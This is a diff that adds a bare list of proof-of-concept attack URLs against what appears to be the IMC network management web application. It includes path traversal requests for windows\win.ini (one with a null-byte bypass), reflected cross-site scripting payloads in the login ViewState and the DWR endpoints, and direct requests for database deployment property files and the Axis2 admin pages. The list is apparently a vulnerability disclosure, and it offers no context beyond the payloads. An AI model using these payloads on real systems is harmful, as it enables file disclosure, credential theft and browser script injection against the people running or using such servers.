@@ -1,0 +1,11 @@
+http://www.example.com:8080/imc/report/DownloadReportSource?dirType=webapp&amp;fileDir=reports&amp;fileName=reportParaExample.xml..\..\..\..\..\..\..\..\..\..\windows\win.ini
+http://www.example.com:8080/imc/report/DownloadReportSource?dirType=webapp&amp;fileDir=reports..\..\..\..\..\..\..\..\windows\win.ini%00reports&amp;fileName=reportParaExample.xml 
+http://www.example.com:8080/imc/login.jsf?loginForm%3a_link_hidden_=&amp;javax.faces.ViewState=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com:8080/imc/dwr/call/plaincall/blah?callCount=&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com:8080/imc/dwr/interface/&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com:8080/imc/reportscript/sqlserver/deploypara.properties
+http://www.example.com:8080/rpt/reportscript/sqlserver/deploypara.properties
+http://www.example.com:8080/imc/reportscript/oracle/deploypara.properties
+http://www.example.com:8080/imcws/
+http://www.example.com:8080/imcws/services/listServices
+http://www.example.com:8080/imcws/axis2-admin/
